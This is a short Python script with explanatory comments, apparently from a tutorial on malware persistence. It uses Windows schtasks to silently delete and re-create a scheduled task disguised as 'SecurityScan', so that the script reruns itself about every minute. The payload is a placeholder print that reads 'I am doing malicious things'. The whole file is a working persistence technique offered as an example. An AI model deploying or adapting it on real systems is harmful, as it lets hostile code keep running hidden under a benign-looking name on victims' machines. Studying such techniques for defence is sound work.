import os, random
from datetime import datetime,timedelta

#This command calls the schtasks program, states that it wants to query the task list, and looks for a task name (/tn) of SecurityScan 
if os.system("schtasks /query /tn SecurityScan") == 0:
    #If this task exists within the list, it is deleted with schtasks /delete /f /tn SecurityScan. In this command, 
    #the /f flag suppresses the confirmation warning, enabling the command to complete silently.
    os.system("schtasks /delete /f /tn SecurityScan")

#After deleting any previous instances of its task, TaskScheduler executes its malicious 
#functionality (printing I am doing malicious things). When this is complete, it starts scheduling the next iteration of the task.
print("I am doing malicious things")
 
filedir = os.path.join(os.getcwd(),"TaskScheduler.py")

# Randomize a short delay (up to 1 minute). The timedelta function allows us to convert our interval into minutes and add it to the
# current time calculated using datetime.now(). The result is stored in dt.

maxInterval = 1
interval = 1+(random.random()*(maxInterval-1))
dt = datetime.now() + timedelta(minutes=interval)

# Format time and date for schtasks
t = "%s:%s" % (str(dt.hour).zfill(2),str(dt.minute).zfill(2))
d = "%s/%s/%s" % (str(dt.day).zfill(2),str(dt.month).zfill(2),dt.year)
 
os.system('schtasks /create /tn SecurityScan /tr \"%s\" /sc once \
/st %s /sd %s' % (filedir,t,d))
input()  
